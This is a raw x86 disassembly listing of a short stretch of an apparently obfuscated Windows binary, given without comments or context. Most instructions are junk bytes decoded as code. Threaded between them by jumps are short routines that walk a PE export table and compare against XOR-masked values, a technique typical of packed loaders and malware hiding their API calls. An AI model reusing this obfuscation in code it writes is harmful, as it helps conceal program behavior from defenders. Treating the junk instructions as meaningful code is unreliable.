  40b8dd:	inc    esi
  40b8de:	sub    BYTE PTR [ecx+0x11cb711c],cl
  40b8e4:	test   eax,0x5d0d99c
  40b8e9:	xchg   esp,eax
  40b8ea:	or     BYTE PTR [ecx+0x38d5d579],cl
  40b8f0:	cmp    BYTE PTR [ecx-0x502754d5],bh
  40b8f6:	nop
  40b8f7:	xor    ah,al
  40b8f9:	rol    eax,1
  40b8fb:	out    0x58,al
  40b8fd:	cwde   
  40b8fe:	mov    esi,0x103b6d54
  40b903:	ret    
  40b904:	hlt    
  40b905:	lea    ebx,[ebx]
  40b907:	fwait
  40b908:	adc    ecx,DWORD PTR [ebx]
  40b90a:	push   ebp
  40b90b:	fs cmp al,0xa3
  40b90e:	adc    eax,0xc589aee8
  40b913:	ficom  WORD PTR [edi+0x38d0b158]
  40b919:	test   BYTE PTR [edi-0x2d4077a9],bl
  40b91f:	sub    DWORD PTR [ecx*4+0x44b459c9],0x4a89313d
  40b92a:	xlat   BYTE PTR ds:[ebx]
  40b92b:	jp     0x40b8cd
  40b92d:	sbb    edx,DWORD PTR [edx+0x37]
  40b930:	push   eax
  40b931:	xor    ebx,esi
  40b933:	mov    ch,0x4e
  40b935:	mov    esi,0x89e6d66d
  40b93a:	dec    ebp
  40b93b:	aam    0x8b
  40b93d:	inc    ebp
  40b93e:	in     al,dx
  40b93f:	mov    ecx,DWORD PTR [ebp+0x8]
  40b942:	add    ecx,DWORD PTR [eax+0x1c]
  40b945:	xor    esi,esi
  40b947:	mov    DWORD PTR [ebp-0x14],ecx
  40b94a:	mov    eax,DWORD PTR [ebp-0x28]
  40b94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40b950:	add    ecx,DWORD PTR [eax+edi*4]
  40b953:	jmp    0x40ba38
  40b958:	pop    ss
  40b959:	pusha  
  40b95a:	pop    esp
  40b95b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b95c:	jns    0x40b916
  40b95e:	out    0x61,eax
  40b960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b961:	push   ds
  40b962:	jg     0x40b96d
  40b964:	aam    0xf8
  40b966:	mov    al,fs:0x7e7e3379
  40b96c:	mov    dh,0x7e
  40b96e:	jle    0x40b9ee
  40b970:	jmp    0x40b906
  40b972:	dec    ebp
  40b973:	mov    ecx,esi
  40b975:	jmp    0x2898a455
  40b97a:	or     dh,BYTE PTR [ecx+ecx*8-0x63]
  40b97e:	loope  0x40b970
  40b980:	xchg   esp,eax
  40b981:	or     eax,0xe26c616d
  40b986:	add    BYTE PTR ds:0x8cdc44c0,dh
  40b98c:	ds js  0x40b9e0
  40b98f:	push   edi
  40b990:	scas   al,BYTE PTR es:[edi]
  40b991:	test   eax,0xcbd742e2
  40b996:	(bad)  
  40b997:	sbb    al,bh
  40b999:	dec    edi
  40b99a:	test   al,0x7
  40b99c:	sahf   
  40b99d:	clc    
  40b99e:	mov    cl,0x6f
  40b9a0:	in     eax,dx
  40b9a1:	pop    esp
  40b9a2:	and    cl,ch
  40b9a4:	inc    edi
  40b9a5:	js     0x40b99f
  40b9a7:	jbe    0x40b9be
  40b9a9:	and    ch,dh
  40b9ab:	add    eax,0xadd94251
  40b9b0:	dec    edi
  40b9b1:	les    ebp,FWORD PTR [ebp-0x21]
  40b9b4:	mov    DWORD PTR [ebp-0x29f8b79e],eax
  40b9ba:	test   al,0x2e
  40b9bc:	mov    ch,0x5f
  40b9be:	test   BYTE PTR [ebx-0x58917d7a],0x50
  40b9c5:	pop    ecx
  40b9c6:	call   0x45c4:0x91ca8842
  40b9cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9ce:	sub    dl,BYTE PTR [esi-0x34586a10]
  40b9d4:	ja     0x40b9ab
  40b9d6:	add    BYTE PTR [esi-0x7f7e4f79],ch
  40b9dc:	xor    BYTE PTR [ecx-0x56],ah
  40b9df:	icebp  
  40b9e0:	aaa    
  40b9e1:	mov    edi,eax
  40b9e3:	or     al,0x71
  40b9e5:	fs dec esi
  40b9e7:	repz sub al,BYTE PTR [edi+0x1fc81b12]
  40b9ee:	jmp    0x1640:0x79dbaf27
  40b9f5:	xchg   ecx,eax
  40b9f6:	push   ds
  40b9f7:	pop    ebp
  40b9f8:	es rol ecx,0x58
  40b9fc:	pusha  
  40b9fd:	pop    ds
  40b9fe:	inc    ebx
  40b9ff:	sub    edx,DWORD PTR [esi]
  40ba01:	nop
  40ba02:	sbb    eax,0x2861bca3
  40ba07:	ret    
  40ba08:	int3   
  40ba09:	push   edi
  40ba0a:	mov    bl,0x84
  40ba0c:	cld    
  40ba0d:	sbb    al,0xca
  40ba0f:	and    dl,BYTE PTR fs:[edi-0x4c17c85f]
  40ba16:	repz pop ecx
  40ba18:	and    DWORD PTR [eax],ebx
  40ba1a:	sbb    dl,BYTE PTR [edx+0x1a7328bd]
  40ba20:	pop    ds
  40ba21:	sub    cl,dl
  40ba23:	dec    edi
  40ba24:	add    esi,DWORD PTR [edi]
  40ba26:	lods   al,BYTE PTR ds:[esi]
  40ba27:	jne    0x40ba5f
  40ba29:	test   DWORD PTR [ecx+0x781985c7],ecx
  40ba2f:	add    BYTE PTR [eax-0x78454af],dh
  40ba35:	into   
  40ba36:	push   edx
  40ba37:	push   edi
  40ba38:	lea    eax,[ebp-0x8]
  40ba3b:	mov    DWORD PTR [ebp-0x30],ecx
  40ba3e:	push   eax
  40ba3f:	push   DWORD PTR [ebp-0x30]
  40ba42:	push   DWORD PTR [ebp+0xc]
  40ba45:	call   0x408325
  40ba4a:	mov    eax,DWORD PTR [ebp-0x4]
  40ba4d:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba50:	xor    eax,0x7510859
  40ba55:	add    eax,ebx
  40ba57:	cmp    ecx,eax
  40ba59:	jne    0x40bb61
  40ba5f:	mov    eax,DWORD PTR [ebp-0x20]
  40ba62:	jmp    0x40bb47
  40ba67:	test   BYTE PTR [ebx+0x5b],al
  40ba6a:	scas   al,BYTE PTR es:[edi]
  40ba6b:	pop    ecx
  40ba6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba6d:	jns    0x40bae8
  40ba6f:	and    BYTE PTR [ebx+0x63],cl
  40ba72:	lock lods al,BYTE PTR ds:[esi]
  40ba74:	nop
  40ba75:	push   0x7e30b17d
  40ba7a:	jle    0x40ba32
  40ba7c:	jle    0x40bafc
  40ba7e:	jle    0x40ba2f
  40ba80:	aad    0x14
  40ba82:	dec    edx
  40ba83:	sbb    ch,bl
  40ba85:	data16 loope 0x40ba0c
  40ba88:	and    DWORD PTR [edi-0x265e4f0e],ebx
  40ba8e:	and    edx,ecx
  40ba90:	and    BYTE PTR [esi+0x793a824d],0xdb
  40ba97:	mov    dl,0xcf
  40ba99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba9a:	in     al,0xa9
  40ba9c:	jns    0x40bae7
  40ba9e:	jnp    0x40bb1a
  40baa0:	sgdtd  [ecx-0x6a9b3bea]
  40baa7:	call   0x2425da71
  40baac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baad:	stos   DWORD PTR es:[edi],eax
  40baae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40baaf:	or     eax,0xf1070d95
  40bab4:	pop    ss
  40bab5:	imul   BYTE PTR [esi]
  40bab7:	mov    dl,0xb3
  40bab9:	in     eax,dx
  40baba:	mul    DWORD PTR [ebp+ebx*8-0xd0e8cae]
  40bac1:	(bad)  
  40bac3:	inc    ebp
  40bac4:	daa    
  40bac5:	add    ah,al
  40bac7:	das    
  40bac8:	ss jb  0x40bb45
  40bacb:	int3   
  40bacc:	gs aam 0xcc
  40bacf:	stc    
  40bad0:	lock scas al,BYTE PTR es:[edi]
  40bad2:	xchg   edx,esi
  40bad4:	fwait
  40bad5:	pop    ecx
  40bad6:	jg     0x40bad7
  40bad8:	fdivr  st(6),st
  40bada:	mov    ebp,0xbe89dead
  40badf:	pushf  
  40bae0:	or     al,0xa0
  40bae2:	(bad)  
  40bae3:	cmp    DWORD PTR [ecx],eax
  40bae5:	nop
  40bae6:	shl    DWORD PTR [esi+0x38c277bf],0xa
  40baed:	cmc    
  40baee:	dec    esi
  40baef:	sti    
  40baf0:	add    al,0xba
  40baf2:	int    0x8d
  40baf4:	fcomp  DWORD PTR [ecx+0x6538a950]
  40bafa:	aad    0x79
  40bafc:	in     al,dx
  40bafd:	jb     0x40baaf
  40baff:	dec    esp
  40bb00:	aaa    
  40bb01:	pop    ebx
  40bb02:	loopne 0x40bb00
  40bb04:	sbb    dl,dh
  40bb06:	stos   DWORD PTR es:[edi],eax
  40bb07:	mov    ?,edi
  40bb09:	retfw  0xa49a
  40bb0d:	push   esp
  40bb0e:	inc    ebx
  40bb0f:	clc    
  40bb10:	push   esi
  40bb11:	xchg   edx,eax
  40bb12:	mov    cl,0xa5
  40bb14:	jg     0x40bb7e
  40bb16:	scas   al,BYTE PTR es:[edi]
  40bb17:	jb     0x40bb43
  40bb19:	or     DWORD PTR [ecx-0x20baddf0],esi
  40bb1f:	add    DWORD PTR [ebp+0x72],0x4e
  40bb23:	push   gs
  40bb25:	pop    edx
  40bb26:	out    0xd5,eax
  40bb28:	inc    esi
  40bb29:	repnz enter 0xfeed,0xc8
  40bb2e:	push   edx
  40bb2f:	jmp    DWORD PTR [edi+edi*1-0x6c]
  40bb33:	xor    DWORD PTR [ebp-0x6f],ecx
  40bb36:	ficom  WORD PTR [ecx+0x5c]
  40bb39:	push   0xfc5dc918
  40bb3e:	aad    0x2
  40bb40:	adc    DWORD PTR [esi+0x151bbd1b],esp
  40bb46:	out    0x47,eax
  40bb48:	cmp    edi,eax
  40bb4a:	jb     0x40b2a5
  40bb50:	jmp    0x40bb71
  40bb55:	mov    eax,DWORD PTR [ebp-0x4]
  40bb58:	xor    eax,esi
  40bb5a:	add    eax,ebx
  40bb5c:	jmp    0x40c696
  40bb61:	mov    eax,DWORD PTR [ebp-0x2c]
  40bb64:	movzx  eax,WORD PTR [eax+edi*2]
  40bb68:	mov    ecx,DWORD PTR [ebp-0x14]
  40bb6b:	mov    eax,DWORD PTR [ecx+eax*4]
  40bb6e:	mov    DWORD PTR [ebp+0xc],eax
  40bb71:	mov    eax,DWORD PTR [ebp-0x4]
  40bb74:	mov    ecx,DWORD PTR [ebp-0x8]
  40bb77:	xor    eax,0x7510859
  40bb7c:	add    eax,ebx
  40bb7e:	cmp    ecx,eax
  40bb80:	jne    0x40bb93
  40bb86:	mov    eax,DWORD PTR [ebp-0x4]
  40bb89:	xor    eax,0x7510859
  40bb8e:	jmp    0x40bb5a
  40bb93:	mov    eax,DWORD PTR [ebp+0xc]
  40bb96:	add    eax,DWORD PTR [ebp+0x8]
  40bb99:	mov    DWORD PTR [ebp-0x10],eax
  40bb9c:	mov    eax,DWORD PTR [ebp-0x1c]
  40bb9f:	test   eax,eax
  40bba1:	je     0x40c2b4
  40bba7:	mov    DWORD PTR [ebp-0x24],esi
  40bbaa:	push   0xb
  40bbac:	pop    ecx
  40bbad:	push   0x5
  40bbaf:	dec    ecx
  40bbb0:	jmp    0x40bc95
  40bbb5:	pop    ss
  40bbb6:	imul   dh
  40bbb8:	mov    bl,0x6f
  40bbba:	jnp    0x40bb77
  40bbbc:	push   0xffffffce
  40bbbe:	pop    ecx
  40bbbf:	and    esi,ebx
  40bbc1:	push   ebx
  40bbc2:	lahf   
  40bbc3:	sbb    ecx,DWORD PTR [eax-0x77]
  40bbc6:	xor    DWORD PTR [esi+0x7e],edi
  40bbc9:	mov    dh,0x7e
  40bbcb:	jle    0x40bc4b
  40bbcd:	mov    al,0x6b
  40bbcf:	adc    bh,BYTE PTR [ebx+0x2147c417]
  40bbd5:	mov    ebx,esp
  40bbd7:	mov    WORD PTR [eax-0x560c8a1f],gs
  40bbdd:	push   ecx
  40bbde:	or     eax,0xc4b77397
  40bbe3:	aad    0x98
  40bbe5:	iret   
  40bbe6:	or     BYTE PTR ds:[eax],al
  40bbe9:	or     al,0x92
  40bbeb:	mov    BYTE PTR [esi+0x56],al
  40bbee:	or     BYTE PTR [eax+eiz*1-0x5d],0xdf
  40bbf3:	push   ds
  40bbf4:	mov    esp,0xd70ecc5
  40bbf9:	clc    
  40bbfa:	jns    0x40bc3b
  40bbfc:	and    DWORD PTR [ecx-0x76],0x506f8c04
  40bc03:	sbb    al,0xaa
  40bc05:	retf   0x8136
  40bc08:	and    al,BYTE PTR [ebx-0x202c3590]
  40bc0e:	cmc    
  40bc0f:	popa   
  40bc10:	push   esp
  40bc11:	sub    DWORD PTR [ebp+0x5b],0xc6c9fa26
  40bc18:	jge    0x40bc88
  40bc1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc1b:	jne    0x40bc5c
  40bc1d:	sub    BYTE PTR [ebp+0x5037f7c],ah
  40bc23:	ins    DWORD PTR es:[edi],dx
  40bc24:	mov    DWORD PTR ds:0x4cf5156a,0x4dd83979
  40bc2e:	and    BYTE PTR [ecx],cl
  40bc30:	sti    
  40bc31:	test   al,0x2f
  40bc33:	adc    eax,0x7d504753
  40bc38:	xchg   BYTE PTR [edi+0x74114240],dl
  40bc3e:	jo     0x40bcaa
  40bc40:	jnp    0x40bc39
  40bc42:	aam    0x3d
  40bc44:	pushf  
  40bc45:	add    cl,BYTE PTR [eax+0x7b]
  40bc48:	jle    0x40bc82
  40bc4a:	mov    ds:0x49c5bf16,al
  40bc4f:	add    al,0x20
  40bc51:	stc    
  40bc52:	jg     0x40bca4
  40bc54:	daa    
  40bc55:	fs push esi
  40bc57:	add    DWORD PTR [esi+ebx*1],0xffffffd8
  40bc5b:	mov    esi,0x78a2559
  40bc60:	lock inc eax
  40bc62:	aad    0x31
  40bc64:	jnp    0x40bcda
  40bc66:	aas    
  40bc67:	and    edx,DWORD PTR [edi-0x71]
  40bc6a:	mul    ch
  40bc6c:	jmp    0x40bc72
  40bc6e:	fwait
  40bc6f:	jbe    0x40bc65
  40bc71:	fistp  DWORD PTR [ecx-0x5]
  40bc74:	inc    ebx
  40bc75:	out    dx,eax
  40bc76:	or     eax,0x7caa768b
  40bc7b:	fimul  DWORD PTR [ecx]
  40bc7d:	daa    
  40bc7e:	dec    ebx
  40bc7f:	ret    0x99b7
  40bc82:	addr16 aas 
  40bc84:	test   al,0x10
  40bc86:	jg     0x40bc59
  40bc88:	ins    BYTE PTR es:[edi],dx
  40bc89:	cwde   
  40bc8a:	shl    al,0x47
  40bc8d:	clc    
  40bc8e:	and    al,0x1d
  40bc90:	in     eax,dx
  40bc91:	das    
  40bc92:	aad    0xc9
  40bc94:	mov    ch,0x5b
  40bc96:	xchg   ebx,ecx
  40bc98:	sub    ebx,ecx
  40bc9a:	xchg   ebx,ecx
  40bc9c:	dec    ecx
  40bc9d:	mov    eax,DWORD PTR [ebp-0x1c]
  40bca0:	imul   eax,ecx
  40bca3:	sub    esp,eax
  40bca5:	mov    DWORD PTR [ebp-0x24],esp
  40bca8:	mov    eax,DWORD PTR [ebp-0x4]
  40bcab:	mov    ecx,0x7510859
  40bcb0:	jmp    0x40bd95
  40bcb5:	xchg   edi,eax
  40bcb6:	adc    DWORD PTR [ecx+eax*2+0x78],0x79
  40bcbb:	mov    ebx,0xdff72d79
  40bcc0:	ins    DWORD PTR es:[edi],dx
  40bcc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcc2:	mov    esi,0x36c10a96
  40bcc7:	jle    0x40bd47
  40bcc9:	mov    dh,0x7e
  40bccb:	jle    0x40bd4b
  40bccd:	adc    bh,BYTE PTR [ebp+ebp*1-0x4e106ba]
  40bcd4:	pop    ecx
  40bcd5:	test   DWORD PTR [eax-0x31d64504],eax
  40bcdb:	int    0xf2
  40bcdd:	jb     0x40bc67
  40bcdf:	jno    0x40bd18
  40bce1:	sub    al,0xd
  40bce3:	pusha  
  40bce4:	add    al,0x24
  40bce6:	pop    ds
  40bce7:	ins    DWORD PTR es:[edi],dx
  40bce8:	mov    ch,0xd
  40bcea:	mov    esp,0x40a9e712
  40bcef:	fdiv   QWORD PTR [ebx+ecx*8+0x19117cab]
  40bcf6:	les    edx,FWORD PTR [ecx+0x32]
  40bcf9:	pop    es
  40bcfa:	or     BYTE PTR [ebx+0x2b16c0f2],dl
  40bd00:	adc    esp,ecx
  40bd02:	into   
  40bd03:	or     DWORD PTR es:[ebp+0x3f4d6e9d],0x28
  40bd0b:	pop    edi
  40bd0c:	xchg   edi,eax
  40bd0d:	aas    
  40bd0e:	enter  0x2717,0x68
  40bd12:	dec    ecx
  40bd13:	repz add eax,0x725b583a
  40bd19:	jl     0x40bd30
  40bd1b:	shr    BYTE PTR [ecx+0x5a51b471],1
  40bd21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd22:	jo     0x40bcd6
  40bd24:	ss jne 0x40bd3e
  40bd27:	pop    eax
  40bd28:	call   0x723c:0x2bdd27b
  40bd2f:	and    eax,0xbafcf75c
  40bd34:	xchg   ebx,eax
  40bd35:	sbb    DWORD PTR [ebx+0x79195969],esp
  40bd3b:	scas   eax,DWORD PTR es:[edi]
  40bd3c:	pop    edi
  40bd3d:	pop    ecx
  40bd3e:	loope  0x40bd8b
  40bd40:	and    cl,bl
  40bd42:	cmc    
  40bd43:	mov    edi,0x50038f47
  40bd48:	inc    eax
  40bd49:	(bad)  [edi+0x12c61e5d]
  40bd4f:	aas    
  40bd50:	std    
  40bd51:	mov    ah,0xea
  40bd53:	xchg   ebp,eax
  40bd54:	pop    ss
  40bd55:	mov    esp,0x97a151df
  40bd5a:	push   es
  40bd5b:	rcr    BYTE PTR [esi+0x2cb8917c],1
  40bd61:	test   eax,0x5272ef89
  40bd66:	sar    DWORD PTR [edx+0xf],0x71
  40bd6a:	or     BYTE PTR [esi-0x72999e13],ah
  40bd70:	test   eax,0x4f4517f
  40bd75:	pop    ecx
  40bd76:	add    esp,edx
  40bd78:	dec    esp
  40bd79:	adc    al,0x76
  40bd7b:	xor    dh,BYTE PTR [edx+eax*2-0x31247561]
  40bd82:	loop   0x40bdb8
  40bd84:	test   DWORD PTR [ebp+0x44],eax
  40bd87:	outs   dx,BYTE PTR ds:[esi]
  40bd88:	sub    dh,BYTE PTR [esi]
  40bd8a:	dec    esi
  40bd8b:	std    
  40bd8c:	or     dl,ch
  40bd8e:	and    DWORD PTR [ecx+0x8861cd4],esp
  40bd94:	and    BYTE PTR [ebx],dh
  40bd96:	sar    DWORD PTR [edx+0x32729f],0x3
  40bd9d:	ret    0x4589
  40bda0:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  40bda6:	add    eax,edx
  40bda8:	mov    edx,DWORD PTR [ebp+0x14]
  40bdab:	jmp    0x40be90
  40bdb0:	dec    DWORD PTR [ebx-0x47d6c7ef]
  40bdb6:	xchg   DWORD PTR [ecx-0x43979b07],edi
  40bdbc:	sti    
  40bdbd:	jp     0x40bdab
  40bdbf:	push   0x19
  40bdc1:	aaa    
  40bdc2:	jle    0x40be42
  40bdc4:	mov    dh,0x7e
  40bdc6:	jle    0x40be46
  40bdc8:	in     al,0x22
  40bdca:	push   ebp
  40bdcb:	xchg   BYTE PTR [ebp+0xf],ch
  40bdce:	in     al,0x7b
  40bdd0:	ins    DWORD PTR es:[edi],dx
  40bdd1:	out    dx,al
  40bdd2:	xchg   ebp,eax
  40bdd3:	sbb    al,dh
  40bdd5:	(bad)  
  40bdd6:	jl     0x40bd82
  40bdd8:	push   cs
  40bdd9:	cmp    al,0x73
  40bddb:	sti    
  40bddc:	repnz push es
  40bdde:	adc    edx,DWORD PTR [edi+esi*4-0x63ee4d9c]
  40bde5:	dec    esi
  40bde6:	mov    ch,0xc9
  40bde8:	iret   
  40bde9:	or     BYTE PTR ds:0x82342aba,dl
  40bdef:	xor    dh,BYTE PTR [ebx+0x75764495]
  40bdf5:	mov    al,0x8b
  40bdf7:	shl    BYTE PTR [eax+0x63],0xed
  40bdfb:	daa    
  40bdfc:	hlt    
  40bdfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdfe:	into   
  40bdff:	inc    ecx
  40be00:	cdq    
  40be01:	xchg   esi,eax
  40be02:	into   
  40be03:	xor    eax,0x1f9c6c07
  40be08:	pop    esi
  40be09:	push   0x5
  40be0b:	mov    ch,0x56
  40be0d:	mov    edx,0x2db3992d
  40be12:	xor    ebx,DWORD PTR ds:0x162a9f50
  40be18:	scas   al,BYTE PTR es:[edi]
  40be19:	mov    edx,0x96c95d48
  40be1e:	cld    
  40be1f:	push   esp
  40be20:	xlat   BYTE PTR ds:[ebx]
  40be21:	es out dx,al
  40be23:	mov    edx,0xa92ed628
  40be28:	(bad)  [edx]
  40be2a:	sbb    esp,esp
  40be2c:	xchg   BYTE PTR ds:0x57ec56eb,al
  40be32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be33:	and    bh,bh
  40be35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be36:	dec    edi
  40be37:	dec    ebx
  40be38:	scas   eax,DWORD PTR es:[edi]
  40be39:	adc    BYTE PTR [ebx],al
  40be3b:	pop    ss
  40be3c:	cmc    
  40be3d:	mov    cl,0xa1
  40be3f:	inc    ebp
  40be40:	and    eax,0x71c38e4c
  40be45:	or     eax,0xff87cb9a
  40be4a:	es es inc esi
  40be4d:	ret    0x790d
  40be50:	mov    edx,0xbe754fff
  40be55:	xchg   ebp,eax
  40be56:	push   ecx
  40be57:	popf   
  40be58:	mov    ch,0x9e
  40be5a:	add    edi,DWORD PTR [ebx]
  40be5c:	and    DWORD PTR [ecx-0x44],esp
  40be5f:	cmp    eax,ebp
  40be61:	sub    ebx,edx
  40be63:	cmp    BYTE PTR [edx+0x1d2d502a],bl
  40be69:	jecxz  0x40bed1
  40be6b:	add    dl,BYTE PTR [eax+0x584f2181]
  40be71:	sahf   
  40be72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be73:	sbb    DWORD PTR [esi+0x31],edx
  40be76:	cwde   
  40be77:	es js  0x40beb9
  40be7a:	sub    dl,0x57
  40be7d:	push   ss
  40be7e:	hlt    
  40be7f:	pop    ss
  40be80:	inc    esi
  40be81:	in     al,dx
  40be82:	dec    esi
  40be83:	push   ss
  40be84:	(bad)  
  40be85:	xlat   BYTE PTR ds:[ebx]
  40be86:	lea    ebp,[ecx+0x3ed1d05e]
  40be8c:	lods   al,BYTE PTR ds:[esi]
  40be8d:	fistp  DWORD PTR cs:[ebx-0x16fd50f1]
  40be94:	loopne 0x40be96
  40be96:	add    BYTE PTR [eax],al
  40be98:	inc    ebp
  40be99:	loop   0x40be83
  40be9b:	xchg   edi,eax
  40be9c:	imul   esp,DWORD PTR [ebp-0x36f31fa7],0xdd497640
  40bea6:	mov    dl,0x15
  40bea8:	push   ecx
  40bea9:	aaa    
  40beaa:	jle    0x40bf2a
  40beac:	mov    dh,0x7e
  40beae:	jle    0x40bf2e
  40beb0:	fdiv   st,st(0)
  40beb2:	cmp    ch,ah
  40beb4:	sub    esi,ebx
  40beb6:	inc    eax
  40beb7:	gs mov esp,0x9b5ae561
  40bebd:	adc    bh,BYTE PTR ds:[edx]
  40bec0:	push   edi
  40bec1:	push   ds
  40bec2:	nop
  40bec3:	aam    0x48
  40bec5:	int3   
  40bec6:	popa   
  40bec7:	test   al,0x51
  40bec9:	and    al,0xce
  40becb:	je     0x40be86
  40becd:	push   ss
  40bece:	and    eax,0x279cfee7
  40bed3:	popa   
  40bed4:	dec    ecx
  40bed5:	mov    es,WORD PTR [ecx+0x1188fadb]
  40bedb:	jnp    0x40becc
  40bedd:	mov    ds:0x9367e92c,eax
  40bee2:	ror    DWORD PTR [ecx-0x20],cl
  40bee5:	sub    al,0xd3
  40bee7:	stos   DWORD PTR es:[edi],eax
  40bee8:	xchg   edx,eax
  40bee9:	ins    DWORD PTR es:[edi],dx
  40beea:	pusha  
  40beeb:	retf   0xede0
  40beee:	pop    ebp
  40beef:	xchg   DWORD PTR [eax+0x31],edi
  40bef2:	inc    ebp
  40bef3:	mov    ah,0x2
  40bef5:	inc    ebp
  40bef6:	fdiv   QWORD PTR fs:[ebx+0x5a]
  40befa:	out    0xee,eax
  40befc:	push   edi
  40befd:	icebp  
  40befe:	sahf   
  40beff:	sbb    BYTE PTR [edx+0x3c],0x6d
  40bf03:	call   0xf10c2c70
  40bf08:	shl    BYTE PTR [esi-0x67],0x1f
  40bf0c:	fs retf 0xf479
  40bf10:	mov    bh,0x13
  40bf12:	ficom  WORD PTR [eax+0x6c]
  40bf15:	aam    0x98
  40bf17:	ja     0x40bf05
  40bf19:	aad    0xe
  40bf1b:	mov    ebp,esp
  40bf1d:	imul   DWORD PTR [eax-0x4a6421e0]
  40bf23:	sbb    edi,eax
  40bf25:	into   
  40bf26:	or     al,0x84
  40bf28:	mov    BYTE PTR fs:[edx+0x6a],al
  40bf2c:	jb     0x40bf8f
  40bf2e:	mov    bl,BYTE PTR [edi-0x3c]
  40bf31:	mov    ebp,0xd3836308
  40bf36:	enter  0xf63a,0x88
  40bf3a:	lods   eax,DWORD PTR ds:[esi]
  40bf3b:	cmp    bl,bl
  40bf3d:	in     al,dx
  40bf3e:	xlat   BYTE PTR ds:[ebx]
  40bf3f:	les    eax,FWORD PTR [edx]
  40bf41:	push   ss
  40bf42:	push   ebx
  40bf43:	push   esi
  40bf44:	jl     0x40bf14
  40bf46:	dec    edx
  40bf47:	sub    esi,0xf59faa0c
  40bf4d:	mov    dh,0x92
  40bf4f:	dec    esi
  40bf50:	sub    eax,0x4a9591a1
  40bf55:	sar    DWORD PTR [edi-0x1669fcbc],cl
  40bf5b:	sahf   
  40bf5c:	sbb    al,0x7c
  40bf5e:	pop    ebp
  40bf5f:	mov    bh,0x77
  40bf61:	retf   
  40bf62:	jp     0x40bf48
  40bf64:	loopne 0x40bf06
  40bf66:	pop    ds
  40bf67:	adc    DWORD PTR [edx+ebp*2+0x6c],ecx
  40bf6b:	adc    DWORD PTR [esi],eax
  40bf6d:	mov    ah,0x63
  40bf6f:	cwde   
  40bf70:	push   edi
  40bf71:	int    0xb2
  40bf73:	sub    ecx,esi
  40bf75:	lds    ebx,FWORD PTR [ebp+ebx*2+0x33fc558b]
  40bf7c:	ror    DWORD PTR [ebx-0x7372f7b3],1
  40bf82:	or     bl,BYTE PTR [edi+0x3b003272]
  40bf88:	enter  0x840f,0x3b
  40bf8c:	add    al,BYTE PTR [eax]
  40bf8e:	add    BYTE PTR [ebx+0x458be87d],cl
  40bf94:	or     BYTE PTR [ebx+0x448b1455],cl
  40bf9a:	add    BYTE PTR [ecx+ebp*8],0xe0
  40bf9e:	add    BYTE PTR [eax],al
  40bfa0:	add    BYTE PTR [edi],dl
  40bfa2:	sub    al,0x93
  40bfa4:	sub    edi,DWORD PTR [ecx+0x192097b9]
  40bfaa:	jne    0x40bf81
  40bfac:	stos   BYTE PTR es:[edi],al
  40bfad:	stos   DWORD PTR es:[edi],eax
  40bfae:	test   eax,0x34a90215
  40bfb3:	jle    0x40c033
  40bfb5:	mov    dh,0x7e
  40bfb7:	jle    0x40c037
  40bfb9:	test   al,0x87
  40bfbb:	lds    eax,FWORD PTR [edx+ebx*8+0x11eeca8d]
  40bfc2:	icebp  
  40bfc3:	mov    DWORD PTR [ebx],esi
  40bfc5:	or     BYTE PTR [ebp+0x42],0xd
  40bfc9:	sti    
  40bfca:	cmp    eax,0x2d581622
  40bfcf:	dec    edi
  40bfd0:	xor    dl,BYTE PTR [eax+0x31]
  40bfd3:	push   esi
  40bfd4:	mov    eax,ds:0xa667d1b1
  40bfd9:	mov    ecx,0x62b51694
  40bfde:	lock jne 0x40bfea
  40bfe1:	cmp    bl,BYTE PTR [esi]
  40bfe3:	imul   edx,DWORD PTR ds:[ecx-0x60674dcf],0x1e
  40bfeb:	jno    0x40c01a
  40bfed:	mov    ah,bl
  40bfef:	dec    edi
  40bff0:	aas    
  40bff1:	nop
  40bff2:	shr    DWORD PTR [edi-0x27f9a851],cl
  40bff8:	cwde   
  40bff9:	mov    ch,0x7
  40bffb:	dec    edx
  40bffc:	and    cl,BYTE PTR [ebx+0x50673df7]
  40c002:	mov    bl,cl
  40c004:	dec    ecx
  40c005:	aaa    
  40c006:	and    edi,edx
  40c008:	jbe    0x40c089
  40c00a:	cmp    al,0xe9
  40c00c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c00d:	xor    al,0x73
  40c00f:	jo     0x40c006
  40c011:	in     al,0x1d
  40c013:	jmp    0x1f4cbb62
  40c018:	push   ss
  40c019:	call   0xd914:0xc260ee60
  40c020:	dec    esi
  40c021:	or     DWORD PTR [ebx+0x7c7f54b1],edx
  40c027:	fild   QWORD PTR [esi]
  40c029:	pop    ecx
  40c02a:	pop    edi
  40c02b:	outs   dx,DWORD PTR ds:[esi]
  40c02c:	or     dh,BYTE PTR [esi+0x4f5c10dc]
  40c032:	pop    ds
  40c033:	je     0x40c045
  40c035:	dec    ecx
  40c036:	inc    edi
  40c037:	adc    eax,0xa972a92e
  40c03c:	cmc    
  40c03d:	mov    eax,0x39124ac2
  40c042:	jnp    0x40c0a9
  40c044:	mov    al,ds:0xad6ee04e
  40c049:	jge    0x40c0af
  40c04b:	or     dh,BYTE PTR [esi]
  40c04d:	repnz push edx
  40c04f:	int    0x58
  40c051:	cwde   
  40c052:	dec    esi
  40c053:	push   ebp
  40c054:	enter  0x2b97,0x36
  40c058:	sbb    BYTE PTR [ecx],dl
  40c05a:	loop   0x40c0c8
  40c05c:	lock test eax,0xd47e27c2
  40c062:	push   esp
  40c063:	xchg   DWORD PTR [edi+edx*1],esi
  40c066:	jle    0x40c017
  40c068:	xchg   ebp,eax
